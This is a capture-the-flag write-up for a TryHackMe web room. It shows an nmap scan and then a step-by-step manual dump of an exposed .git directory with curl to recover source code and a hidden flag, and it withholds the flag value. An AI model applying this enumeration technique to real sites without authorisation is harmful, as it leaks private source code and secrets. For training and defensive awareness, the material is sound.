# TryHackMe - Room 404

**Difficulty:** Very Easy | **Category:** Web | **Time:** 30 min

## Summary
Web exploitation challenge from the Hacker Holidays 2026 event. The target exposes a Flask application with a misconfigured **exposed .git repository**, leaking the application source code and a staging flag.

## Reconnaissance

### Port scan
```bash
nmap -sC -sV -p 22,8080 <TARGET_IP>
```

**Results:**
- `22/tcp` - OpenSSH 9.6p1 (Ubuntu)
- `8080/tcp` - Werkzeug httpd 3.0.1 (Python Flask) - "Byte Lotus - Stay Noticed"

The NSE script `http-git` detected the exposed Git repository.

## Enumeration - Dumping the exposed .git

The `.git/` folder was publicly accessible. Recovered the source tree manually:

```bash
# 1. Read HEAD
curl http://<TARGET_IP>:8080/.git/HEAD
# -> ref: refs/heads/main

# 2. Read the branch ref
curl http://<TARGET_IP>:8080/.git/refs/heads/main

# 3. Fetch the commit object
curl http://<TARGET_IP>:8080/.git/objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda

# 4. Fetch the tree object -> lists files
curl http://<TARGET_IP>:8080/.git/objects/fa/45dbd69394ea9e13683d9efb6a0220daac59d4

# 5. Fetch each blob (decompress with zlib)
curl http://<TARGET_IP>:8080/.git/objects/a5/965c580fee91d852e5b19a8290da02d2926523
```

## Findings

| File | Content |
|------|---------|
| README.md | Project description + staging flag (the answer) |
| app.js | Front-end stub referencing /api/guest |
| index.html | Static landing page (no secrets) |

## Flag
The staging flag was found in the README. Format: THM{...}.

*Flag value kept private per TryHackMe content rules.*

## Key Takeaways
1. Always check for exposed .git/ during web enumeration.
2. Nmap NSE http-git detects it automatically - include -sC in scans.
3. Manual Git object recovery works without git-dumper: HEAD -> ref -> commit -> tree -> blobs.
4. Flask dev servers sometimes serve static files including .git when misconfigured.
